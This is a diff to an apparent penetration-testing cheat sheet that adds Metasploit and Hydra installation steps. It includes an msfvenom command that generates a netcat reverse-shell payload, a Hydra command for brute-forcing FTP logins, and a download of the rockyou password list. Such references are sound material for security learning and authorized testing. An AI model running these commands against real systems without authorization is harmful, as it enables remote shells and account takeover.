@@ -153,5 +153,25 @@ echo "deb https://apt.metasploit.com xenial main" | \
 sudo tee /etc/apt/sources.list.d/metasploit.list
 
 # Install Metaploit framework
-sudo apt list metasploit-framework
+sudo apt install metasploit-framework
+
+# Generate payload for reverse shell using netcat for linux
+msfvenom -p cmd/unix/reverse_netcat lhost=YOUR-IP lport=YOUR-PORT R
+```
+
+## Hydra (Parallelized login cracker)
+
+```bash
+# Install Hydra 9.2 from debian repositories
+sudo apt install hydra
+
+# Cracking FTP service
+hydra -t 4 -l USER -P wordlist.txt -vV YOUR-HOSTNAME ftp
+```
+
+## Wordlists
+
+```bash
+# Download rockyou wordlist
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 ```
